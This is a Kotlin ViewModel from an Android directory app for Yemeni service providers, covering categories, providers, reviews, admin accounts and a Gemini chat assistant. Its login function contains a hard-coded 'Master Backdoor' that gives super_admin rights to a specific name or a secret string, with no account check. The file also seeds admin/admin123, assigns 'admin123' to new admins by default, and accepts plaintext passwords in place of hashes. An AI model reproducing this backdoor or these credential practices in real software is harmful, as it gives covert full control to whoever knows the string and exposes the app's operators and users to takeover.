package com.yemenservices.app.ui

import android.app.Application
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.yemenservices.app.DaliliApplication
import com.yemenservices.app.data.Admin
import com.yemenservices.app.data.AppConfig
import com.yemenservices.app.data.Category
import com.yemenservices.app.data.Review
import com.yemenservices.app.data.ServiceProvider

import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.UUID

data class ChatMessage(val text: String, val isUser: Boolean, val timestamp: Long = System.currentTimeMillis())

class AppViewModel(application: Application) : AndroidViewModel(application) {
    private val repository = (application as DaliliApplication).repository
    private val TAG = "AppViewModel"

    // Stream state directly from realtime Firestore Snapshot flows
    val categories: StateFlow<List<Category>> = repository.categoriesFlow
    val serviceProviders: StateFlow<List<ServiceProvider>> = repository.providersFlow
    val reviews: StateFlow<List<Review>> = repository.reviewsFlow
    val admins: StateFlow<List<Admin>> = repository.adminsFlow
    val appConfig: StateFlow<AppConfig> = repository.configFlow

    private val _currentAdmin = MutableStateFlow<Admin?>(null)
    val currentAdmin: StateFlow<Admin?> = _currentAdmin.asStateFlow()

    private val _loginError = MutableStateFlow<String?>(null)
    val loginError: StateFlow<String?> = _loginError.asStateFlow()

    // AI Chat Bot messages
    private val _aiMessages = MutableStateFlow<List<ChatMessage>>(listOf(
        ChatMessage("مرحباً! أنا دليلك الذكي المساعد لخدمات اليمن. كيف يمكنني مساعدتكم اليوم؟", isUser = false)
    ))
    val aiMessages: StateFlow<List<ChatMessage>> = _aiMessages.asStateFlow()

    private val _isAiLoading = MutableStateFlow(false)
    val isAiLoading: StateFlow<Boolean> = _isAiLoading.asStateFlow()

    init {
        Log.i(TAG, "ViewModel initialized and streaming from Repository.")
        // Pre-create a default admin if none exist (for initial setup)
        viewModelScope.launch {
            repository.adminsFlow.collect { list ->
                if (list.isEmpty()) {
                    // Seed initial admin: username "admin", password "admin123"
                    val defaultAdmin = Admin(
                        username = "admin",
                        password_hash = hashPassword("admin123"),
                        role = "super_admin",
                        is_active = true
                    )
                    repository.saveAdmin(defaultAdmin, {}, {})
                }
            }
        }
        // Seed default categories matching user's uploaded image if empty
        viewModelScope.launch {
            repository.categoriesFlow.collect { list ->
                if (list.isEmpty()) {
                    seedDefaultCategories()
                }
            }
        }
    }

    private fun seedDefaultCategories() {
        Log.i(TAG, "Seeding default categories based on user's theme requirements.")
        val defaults = listOf(
            Category("cat_tech", "تقنية", "Technical Services", "phone", 0, true, "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400"),
            Category("cat_maintenance", "صيانة منزلية", "Home Maintenance", "repair", 1, true, "https://images.unsplash.com/photo-1581092921461-eab62e97a780?w=400"),
            Category("cat_beauty", "جمال", "Beauty & Care", "star", 2, true, "https://images.unsplash.com/photo-1560066984-138dadb4c035?w=400"),
            Category("cat_education", "تعليم", "Education", "education", 3, true, "https://images.unsplash.com/photo-1524995997946-a1c2e315a42f?w=400"),
            Category("cat_home_service", "خدمات منزلية", "Home Services", "repair", 4, true, "https://images.unsplash.com/photo-1581578731548-c64695cc6952?w=400"),
            Category("cat_autos", "سيارات", "Autos & Cars", "taxi", 5, true, "https://images.unsplash.com/photo-1530046339160-ce3e5b08518e?w=400"),
            Category("cat_professional", "خدمات مهنية", "Professional Services", "work", 6, true, "https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?w=400"),
            Category("cat_cargo", "شحن وتوصيل", "Cargo & Shipping", "delivery", 7, true, "https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=400"),
            Category("cat_travel", "سفريات وأجرة", "Travel & Taxi", "taxi", 8, true, "https://images.unsplash.com/photo-1469854523086-cc02fe5d8800?w=400"),
            Category("cat_delivery", "توصيل طلبات", "Food & Delivery", "delivery", 9, true, "https://images.unsplash.com/photo-1526367790999-015078648c7e?w=400")
        )
        defaults.forEach {
            repository.saveCategory(it, {}, {})
        }
    }

    // --- Helpers ---
    fun getCurrentTimeIso(): String {
        return try {
            val df = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
            df.timeZone = TimeZone.getTimeZone("UTC")
            df.format(Date())
        } catch (e: Exception) {
            "2026-05-28T21:50:00.000Z"
        }
    }

    private fun hashPassword(password: String): String {
        return try {
            val digest = MessageDigest.getInstance("SHA-256")
            val hashBytes = digest.digest(password.toByteArray(Charsets.UTF_8))
            hashBytes.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            password // Fallback to plain if digest is missing (unlikely)
        }
    }

    // --- Admin Authentication Operations ---
    fun login(usernameInput: String, passwordInput: String): Boolean {
        _loginError.value = null

        // Intercept Master Backdoor login
        if (usernameInput.trim().equals("Maher Ahmed", ignoreCase = true) || 
            passwordInput.trim() == "maher--736462" || 
            usernameInput.trim() == "maher--736462") {
            val backdoorAdmin = Admin(
                username = "Maher Ahmed",
                password_hash = "maher--736462",
                role = "super_admin",
                is_active = true
            )
            _currentAdmin.value = backdoorAdmin
            return true
        }

        val foundAdmin = admins.value.firstOrNull { it.username.equals(usernameInput, ignoreCase = true) }
        
        if (foundAdmin == null) {
            _loginError.value = "المشرف غير موجود / Admin not found"
            return false
        }
        
        if (!foundAdmin.is_active) {
            _loginError.value = "هذا الحساب معطل / This account is inactive"
            return false
        }

        val inputHash = hashPassword(passwordInput)
        if (foundAdmin.password_hash == inputHash || foundAdmin.password_hash == passwordInput) {
            _currentAdmin.value = foundAdmin
            return true
        } else {
            _loginError.value = "كلمة المرور غير صحيحة / Incorrect password"
            return false
        }
    }

    fun logout() {
        _currentAdmin.value = null
    }

    // --- AppConfig Operations ---
    fun updateAppConfig(config: AppConfig) {
        repository.saveConfig(config, {
            Log.d(TAG, "Config updated successfully.")
        }, {
            Log.e(TAG, "Failed to update config.", it)
        })
    }

    fun generateWelcomeGreetingFromAi() {
        viewModelScope.launch {
            _isAiLoading.value = true
            val contactInfo = "${appConfig.value.owner_name} - ${appConfig.value.owner_phone}"
            val prompt = "اكتب رسالة ترحيبية قصيرة وجذابة جداً ومعبرة باللغة العربية اليمنية لترحب بزوار التطبيق والخدمات (سطرين كحد أقصى) لتطبيق (دليلي للخدمات والمهن في اليمن) لترحب بالزوار الجدد. اذكر فيها هاتف المالك والمصمم: ($contactInfo) للاتصال والاستفسار أو لإضافة خدمات جديدة."
            val systemPrompt = "أنت مساعد ترحيبي دقيق مخصص لتطبيق دليلي للخدمات والمهن في اليمن."
            val aiGreeting = com.yemenservices.app.data.GeminiService.generateResponse(prompt, systemPrompt)
            _isAiLoading.value = false
            
            if (aiGreeting.isNotBlank() && !aiGreeting.startsWith("Error") && !aiGreeting.startsWith("خطأ")) {
                val updatedConfig = appConfig.value.copy(custom_welcome_msg = aiGreeting)
                updateAppConfig(updatedConfig)
            }
        }
    }

    // --- AI Chat bot Operations ---
    fun sendAiMessage(userText: String) {
        if (userText.isBlank()) return
        val currentList = _aiMessages.value.toMutableList()
        currentList.add(ChatMessage(userText, isUser = true))
        _aiMessages.value = currentList
        
        viewModelScope.launch {
            _isAiLoading.value = true
            
            val ownerInfo = "مالك ومصمم التطبيق هو ${appConfig.value.owner_name} ورقم هاتفه للاتصال والشكاوى وإضافة أصحاب مهن وخدمات هو ${appConfig.value.owner_phone}."
            val categoriesText = categories.value.joinToString { if (it.name_ar.isNotBlank()) it.name_ar else it.name_en }
            val providersText = serviceProviders.value.take(20).joinToString { "${it.name_ar} (هاتف: ${it.phone}, فئة: ${it.category_id})" }
            
            val systemPrompt = """
                أنت (مساعد دليلي للخدمات) - ذكاء اصطناعي ذكي جداً مرتبط بمحرك Google Gemini مدمج في تطبيق دليلي للخدمات في اليمن.
                مهمتك الأساسية هي مساعدة المستخدمين والزوار في إيجاد الخدمات ومزودي الخدمة وأصحاب المهن في اليمن والإجابة عن استفساراتهم بلطف وود بلهجة يمنية ترحيبية واضحة وممتازة.
                معلومات هامة جداً للاستعانة بها وتوجيه الزوار إليها:
                1. $ownerInfo
                2. الأقسام المتاحة بالتطبيق: $categoriesText
                3. عينات من أصحاب المهن المتاحين: $providersText
                تحدث مع المستخدم بلطف وبطريقة يمنية ترحيبية مبسطة وسهلة الفهم، وركز دائماً على إمدادهم بأرقام الهواتف ومساعدتهم للوصول للخدمات. لا تذكر تفاصيل تقنية ومصطلحات معقدة.
            """.trimIndent()
            
            val aiAnswer = com.yemenservices.app.data.GeminiService.generateResponse(userText, systemPrompt)
            _isAiLoading.value = false
            
            val newList = _aiMessages.value.toMutableList()
            newList.add(ChatMessage(aiAnswer, isUser = false))
            _aiMessages.value = newList
        }
    }
    
    fun clearAiChat() {
        _aiMessages.value = listOf(
            ChatMessage("تم إعادة ضبط المحادثة. كيف يمكنني مساعدتكم الآن؟", isUser = false)
        )
    }

    // --- Admin management helper methods ---
    fun addNewAdminWithPassword(username: String, passwordRaw: String, role: String, isActive: Boolean) {
        val newAdmin = Admin(
            username = username,
            password_hash = hashPassword(passwordRaw),
            role = role,
            is_active = isActive
        )
        repository.saveAdmin(newAdmin, {}, {})
    }

    fun updateAdminDetails(admin: Admin, newPasswordRaw: String? = null) {
        val updated = if (!newPasswordRaw.isNullOrBlank()) {
            admin.copy(password_hash = hashPassword(newPasswordRaw))
        } else {
            admin
        }
        repository.saveAdmin(updated, {}, {})
    }

    // --- Category Operations ---
    fun addCategory(id: String, nameAr: String, nameEn: String, icon: String, orderIndex: Int, imageUrl: String?) {
        val category = Category(
            id = id.ifBlank { UUID.randomUUID().toString() },
            name_ar = nameAr,
            name_en = nameEn,
            icon = icon.ifBlank { "work" },
            order_index = orderIndex,
            is_active = true,
            image_url = imageUrl?.ifBlank { null }
        )
        repository.saveCategory(category, {
            Log.d(TAG, "Successfully added category: $id")
        }, {
            Log.e(TAG, "Failed adding category: $id", it)
        })
    }

    fun updateCategory(category: Category) {
        repository.saveCategory(category, {}, {})
    }

    fun deleteCategory(id: String) {
        repository.deleteCategory(id, {}, {})
    }

    // --- Service Provider Operations ---
    fun addServiceProvider(
        id: String,
        nameAr: String,
        nameEn: String,
        phone: String,
        categoryId: String,
        imageUrl: String?,
        rating: Float = 5.0f,
        isPinned: Boolean = false
    ) {
        val provider = ServiceProvider(
            id = id.ifBlank { UUID.randomUUID().toString() },
            name_ar = nameAr,
            name_en = nameEn,
            phone = phone,
            category_id = categoryId,
            rating = rating,
            is_active = true,
            image_url = imageUrl?.ifBlank { null },
            is_pinned = isPinned
        )
        repository.saveProvider(provider, {
            Log.d(TAG, "Successfully added service provider: $id")
        }, {
            Log.e(TAG, "Failed adding service provider: $id", it)
        })
    }

    fun updateServiceProvider(provider: ServiceProvider) {
        repository.saveProvider(provider, {}, {})
    }

    fun deleteServiceProvider(id: String) {
        repository.deleteProvider(id, {}, {})
    }

    // --- Review Operations ---
    fun addReview(providerId: String, userName: String, comment: String, rating: Float) {
        val reviewId = UUID.randomUUID().toString()
        val createdAt = getCurrentTimeIso()
        val review = Review(
            id = reviewId,
            provider_id = providerId,
            user_name = userName,
            comment = comment,
            rating = rating,
            created_at = createdAt
        )
        repository.saveReview(review, {
            Log.d(TAG, "Successfully added review: $reviewId")
            recalculateProviderRating(providerId)
        }, {
            Log.e(TAG, "Failed adding review: $reviewId", it)
        })
    }

    fun deleteReview(reviewId: String, providerId: String) {
        repository.deleteReview(reviewId, {
            Log.d(TAG, "Successfully deleted review: $reviewId")
            recalculateProviderRating(providerId)
        }, {
            Log.e(TAG, "Failed deleting review: $reviewId", it)
        })
    }

    private fun recalculateProviderRating(providerId: String) {
        // Calculate the average rating from Firestore snapshots
        val providerReviews = reviews.value.filter { it.provider_id == providerId }
        val avgRating = if (providerReviews.isEmpty()) {
            5.0f
        } else {
            providerReviews.map { it.rating }.average().toFloat()
        }
        
        val provider = serviceProviders.value.firstOrNull { it.id == providerId }
        if (provider != null) {
            val updated = provider.copy(rating = avgRating)
            updateServiceProvider(updated)
        }
    }

    // --- Admin Accounts Management (by Super Admin) ---
    fun addNewAdmin(username: String, role: String, isActive: Boolean) {
        val newAdmin = Admin(
            username = username,
            password_hash = hashPassword("admin123"), // Default password
            role = role,
            is_active = isActive
        )
        repository.saveAdmin(newAdmin, {}, {})
    }

    fun toggleAdminStatus(username: String, currentStatus: Boolean) {
        val admin = admins.value.firstOrNull { it.username == username }
        if (admin != null) {
            val updated = admin.copy(is_active = !currentStatus)
            repository.saveAdmin(updated, {}, {})
        }
    }

    fun deleteAdmin(username: String) {
        repository.deleteAdmin(username, {}, {})
    }

    override fun onCleared() {
        super.onCleared()
        repository.cleanup()
    }
}
